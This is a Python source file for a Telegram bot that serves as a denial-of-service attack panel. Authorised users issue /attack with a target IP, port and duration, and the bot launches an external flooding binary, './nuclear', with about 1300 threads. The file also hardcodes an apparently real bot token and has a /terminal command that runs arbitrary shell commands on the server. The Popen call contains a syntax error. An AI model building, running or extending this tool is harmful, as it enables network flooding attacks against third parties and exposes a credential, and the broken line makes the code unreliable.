import asyncio
import subprocess
from datetime import datetime, timedelta
from aiogram import Bot, Dispatcher, F
from aiogram.enums import ParseMode
from aiogram.types import Message
from aiogram.filters import CommandStart, Command
import logging

API_TOKEN = "7920066907:AAG8H3ISpyqkeaQcth32FySbHAM4b6j77yc"
ADMIN_ID = 6395187566  # change this to your Telegram ID

bot = Bot(token=API_TOKEN, parse_mode=ParseMode.MARKDOWN)
dp = Dispatcher()

users = set()
cooldown_users = {}
DEFAULT_THREADS = 1300
MAX_TIME = 800  # Default max time in seconds

# Emojis
TIMER = "⏳"
SUCCESS = "✅"
BLOCK = "⛔"
FIRE = "🔥"
USER = "👤"


@dp.message(CommandStart())
async def start(message: Message):
    if message.from_user.id != ADMIN_ID and message.from_user.id not in users:
        return await message.reply(f"{BLOCK} Access denied.")
    await message.reply(f"{SUCCESS} Welcome to the bot! use /help to see available commands")


@dp.message(Command("help"))
async def help(message: Message):
    if message.from_user.id != ADMIN_ID and message.from_user.id not in users:
        return await message.reply(f"{BLOCK} Access denied.")
    text = (
        f"{FIRE} *Available Commands:*\n\n"
        "/attack <ip> <port> <time> - Start attack\n"
        "/threads <number> - Set default threads (admin)\n"
        "/maxtime <seconds> - Set max allowed time (admin)\n"
        "/adduser <id> - Add user (admin)\n"
        "/removeuser <id> - Remove user (admin)\n"
        "/users - List users (admin)\n"
        "/terminal <cmd> - Run VPS command (admin)"
    )
    await message.reply(text)


@dp.message(Command("adduser"))
async def add_user(message: Message):
    if message.from_user.id != ADMIN_ID:
        return await message.reply("⛔ Only admin can do this.")
    try:
        uid = int(message.text.split()[1])
        users.add(uid)
        await message.reply(f"{SUCCESS} Added user `{uid}`.")
    except:
        await message.reply("Usage: /adduser <id>")


@dp.message(Command("removeuser"))
async def remove_user(message: Message):
    if message.from_user.id != ADMIN_ID:
        return await message.reply("⛔ Only admin can do this.")
    try:
        uid = int(message.text.split()[1])
        users.discard(uid)
        await message.reply(f"{BLOCK} Removed user `{uid}`.")
    except:
        await message.reply("Usage: /removeuser <id>")


@dp.message(Command("users"))
async def list_users(message: Message):
    if message.from_user.id != ADMIN_ID:
        return await message.reply("⛔ Only admin.")
    if not users:
        await message.reply("No users added.")
    else:
        user_list = "\n".join([f"`{uid}`" for uid in users])
        await message.reply(f"{USER} *Users:*\n{user_list}")


@dp.message(Command("threads"))
async def set_threads(message: Message):
    global DEFAULT_THREADS
    if message.from_user.id != ADMIN_ID:
        return await message.reply("⛔ Admin only.")
    try:
        value = int(message.text.split()[1])
        DEFAULT_THREADS = value
        await message.reply(f"{SUCCESS} Threads set to `{value}`.")
    except:
        await message.reply("Usage: /threads <number>")


@dp.message(Command("maxtime"))
async def set_maxtime(message: Message):
    global MAX_TIME
    if message.from_user.id != ADMIN_ID:
        return await message.reply("⛔ Admin only.")
    try:
        value = int(message.text.split()[1])
        MAX_TIME = value
        await message.reply(f"{SUCCESS} Max attack time set to `{value}` seconds.")
    except:
        await message.reply("Usage: /maxtime <seconds>")


@dp.message(Command("terminal"))
async def terminal(message: Message):
    if message.from_user.id != ADMIN_ID:
        return await message.reply("⛔ Admin only.")
    try:
        cmd = message.text.split(" ", 1)[1]
        output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode()
        if not output.strip():
            output = "✅ Done."
        await message.reply(f"```{output}```")
    except Exception as e:
        await message.reply(f"Error: `{e}`")


@dp.message(Command("attack"))
async def attack(message: Message):
    user_id = message.from_user.id
    if user_id != ADMIN_ID and user_id not in users:
        return await message.reply(f"{BLOCK} Access denied.")

    if user_id in cooldown_users and datetime.now() < cooldown_users[user_id]:
        return await message.reply(f"{TIMER} Wait before next attack!")

    try:
        parts = message.text.split()
        if len(parts) < 4:
            raise ValueError("Not enough arguments.")

        ip = parts[1]
        port = parts[2]
        duration = int(parts[3])
        threads = int(parts[4]) if len(parts) > 4 else DEFAULT_THREADS

        if duration > MAX_TIME:
            return await message.reply(f"{BLOCK} Max allowed time is `{MAX_TIME}` seconds.")

        cooldown_users[user_id] = datetime.now() + timedelta(minutes=1)

        msg = await message.reply(f"{FIRE} Attack started on `{ip}:{port}`\nTime: `{duration}s`\nThreads: `{threads}`")

        asyncio.create_task(run_attack(ip, port, duration, threads, msg))

    except Exception as e:
        await message.reply("Usage: /attack <ip> <port> <time>")


async def run_attack(ip, port, duration, threads, msg):
    try:
        subprocess.Popen(["./nuclear", ip, port, str(duration), str(900) 900])

        start = datetime.now()
        while True:
            elapsed = (datetime.now() - start).seconds
            remaining = duration - elapsed
            if remaining <= 0:
                break
            await msg.edit_text(f"{FIRE} Attacking `{ip}:{port}`\nElapsed: `{elapsed}s`\nRemaining: `{remaining}s`")
            await asyncio.sleep(1)

        await msg.edit_text(f"{SUCCESS} Attack on `{ip}:{port}` completed.")
    except Exception as e:
        await msg.edit_text(f"Error: `{e}`")


async def main():
    logging.basicConfig(level=logging.INFO)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())